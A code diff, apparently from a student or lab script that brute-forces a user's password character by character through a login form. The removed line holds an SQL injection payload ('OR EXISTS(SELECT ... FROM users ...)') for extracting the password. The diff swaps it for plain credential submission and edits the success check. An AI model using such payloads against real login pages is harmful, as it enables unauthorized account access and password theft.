@@ -78,8 +78,10 @@ def readQuery(query, username):
    Raises: tbd
 
    """
-   return username in query
-
+   # return username in query #fails! Jake is returned regardless of who's logging in unless whole password is entered correctly!
+   return "Welcome" in query
+   #should say "Welcome jake you are now logged in!
+   # Log out" if succesful
 
 
 def constructPasswordPayload(character, username, index = "no index"):
@@ -171,12 +173,15 @@ def testPassword(password, username, url):
 
    """
 
-   payload = "' OR EXISTS(SELECT * FROM users WHERE name= '" + username + "' AND password = '" + password + "') AND ''='"
+   # payload = "' OR EXISTS(SELECT * FROM users WHERE name= '" + username + "' AND password = '" + password + "') AND ''='"
+   #this won't work!
+
+   payload = {"name" : username, "password" : password}
 
    r = sendQuery(payload, url)
 
-   return readQuery(r, username);
-
+   # return readQuery(r, username);
+   return username in r #since I changed readQuery
 
 
 
